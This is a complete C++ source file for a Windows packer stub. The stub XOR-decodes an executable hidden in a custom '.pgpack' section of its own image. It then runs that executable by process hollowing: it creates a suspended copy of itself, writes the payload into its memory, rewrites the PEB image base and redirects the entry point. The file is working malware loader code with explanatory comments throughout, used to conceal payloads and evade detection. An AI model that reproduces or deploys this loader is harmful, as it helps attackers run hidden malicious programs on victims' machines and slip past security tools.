#include <iostream>
#include <Windows.h>
#include <winnt.h>
#include <string>
#include <vector>
#include <winternl.h>

#pragma comment(lib, "ntdll")

std::vector<unsigned char> getFile();
bool runPE(void* data);

int main()
{
    std::vector<unsigned char> rawFile = getFile();
    std::cout << rawFile.size() << std::endl;
    if(rawFile.size() != 0)
        runPE(rawFile.data());
    std::cin.get();
    std::cin.get();
}

std::vector<unsigned char> getFile() {
    /* Getting base pointer */
    HMODULE hModule = GetModuleHandle(NULL);
    /* Very simple way to get dos header! */
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)hModule;
    /* For getting ntHeaders, you have to read e_lfanew, and the value of it added with the hModule basePointer leads us to ntHeaders */
    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(((BYTE*)hModule) + dosHeader->e_lfanew);
    /* Getting numOfSections + getting image_section_header array */
    unsigned short numOfSections = ntHeaders->FileHeader.NumberOfSections;
    IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(ntHeaders);

    std::vector<unsigned char> vector;

    for (int i = 0; i < numOfSections; i++) {
        /* As the sections[i].Name is BYTE*(for some wierd reason lol), we have to check it via loop. */
        std::string name = ".pgpack";
        bool flag = true;
        for (int h = 0; h < 8; h++)
            if (name[h] != *(sections[i].Name + h))
                flag = false;
        if (flag) {
            /* Copying data to vector! The vector will be returned once the loop will end! */
            BYTE* ptr = (BYTE*)hModule + sections[i].VirtualAddress;
            BYTE* pEnd = ptr + sections[i].SizeOfRawData;
            while (ptr < pEnd)
            {
                vector.push_back(*ptr++);
            }
        }
    }
    if (vector.size() != 0)
        for (int i = 0; i < vector.size(); i++)
            vector[i] = vector[i] ^ ((BYTE)ntHeaders->FileHeader.TimeDateStamp);

    return vector;
}

bool runPE(void* data) {
    /* You've seen this one in the getFile method.. basically we're getting the dosHeader
    and right after ntHeaders. */

    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)data;
    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(((BYTE*)data) + dosHeader->e_lfanew);


    /* Performing some checks.... */
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE || ntHeaders->Signature != IMAGE_NT_SIGNATURE)
        return false;

#if defined(_WIN64)
	DWORD64 ImageBase;

#elif defined(_WIN32)
	DWORD ImageBase;
#endif

    /* Getting module file name(will be used for creating process) */
    char moduleFileName[MAX_PATH];
    GetModuleFileNameA(GetModuleHandle(NULL), moduleFileName, MAX_PATH);

    PROCESS_INFORMATION pi;
    STARTUPINFOA si;

    /* Clearing pi and startupInfo */
    ZeroMemory(&pi, sizeof(pi));
    ZeroMemory(&si, sizeof(si));


    /* Creates suspended process! */
#ifdef NDEBUG // - no debug
	if (CreateProcessA(moduleFileName, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
#else
	if (CreateProcessA(moduleFileName, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
#endif

        /* Allocating memory to ctx. This will be later used to specify address of entry point! */
        CONTEXT* ctx = LPCONTEXT(VirtualAlloc(NULL, sizeof(ctx), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
        ctx->ContextFlags = CONTEXT_FULL;

        /* Diffrences between x86 and x64
            Eax = Rcx
            Ebx = Rdx
        */

        /* Self explanatory - Retrieves the context of the specified thread. */
        if (GetThreadContext(pi.hThread, ctx)) {

            /* Allocating memory! Most important is the LPVOID pointer! We will use it to write memory into the process */
			LPVOID pImageBase = VirtualAllocEx(pi.hProcess, (LPVOID)(ntHeaders->OptionalHeader.ImageBase),
                ntHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

            /* Writes everything except sections, we will write those in a moment */
			if (WriteProcessMemory(pi.hProcess, pImageBase, data, ntHeaders->OptionalHeader.SizeOfHeaders, NULL)) {
				IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(ntHeaders);
				for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
				{
                    /* Writing sections! */
#if defined(_WIN64)
					WriteProcessMemory(pi.hProcess, (LPVOID)((DWORD64)pImageBase + sections[i].VirtualAddress),
						LPVOID(DWORD64(data) + sections[i].PointerToRawData), sections[i].SizeOfRawData, NULL);

#elif defined(_WIN32)
					WriteProcessMemory(pi.hProcess, (LPVOID)((DWORD)pImageBase + sections[i].VirtualAddress),
						LPVOID(DWORD(data) + sections[i].PointerToRawData), sections[i].SizeOfRawData, NULL);
#endif
				}

				PROCESS_BASIC_INFORMATION pbi;

                /* We need the pbi to get base address of Peb, which will we use to get offset address to where the imagebase should be */

				if (!NtQueryInformationProcess(pi.hProcess, (PROCESSINFOCLASS)0, &pbi, sizeof(pbi), NULL)) {

                    /* Writing the imageBase! */
#if defined(_WIN64)
					if (WriteProcessMemory(pi.hProcess, (LPVOID)(DWORD64(pbi.PebBaseAddress) + (sizeof(LPVOID) * 2)),
						(LPVOID)(&pImageBase), sizeof(LPVOID), 0)) {

#elif defined(_WIN32)
					if (WriteProcessMemory(pi.hProcess, (LPVOID)(DWORD(pbi.PebBaseAddress) + (sizeof(LPVOID) * 2)),
						(LPVOID)(&pImageBase), sizeof(LPVOID), 0)) {
#endif
                        /* Setting address of entry point */
#if defined(_WIN64)
						ctx->Rcx = DWORD64(pImageBase) + ntHeaders->OptionalHeader.AddressOfEntryPoint;

#elif defined(_WIN32)
						ctx->Eax = DWORD(pImageBase) + ntHeaders->OptionalHeader.AddressOfEntryPoint;
#endif
                        /* Setting context and resuming thread! */
						if (SetThreadContext(pi.hThread, LPCONTEXT(ctx))) {
							if (ResumeThread(pi.hThread)) {

								CloseHandle(pi.hProcess);
								CloseHandle(pi.hThread);

								return true;
							}
						}

					}
				}
			}
        }
    }
    return false;
}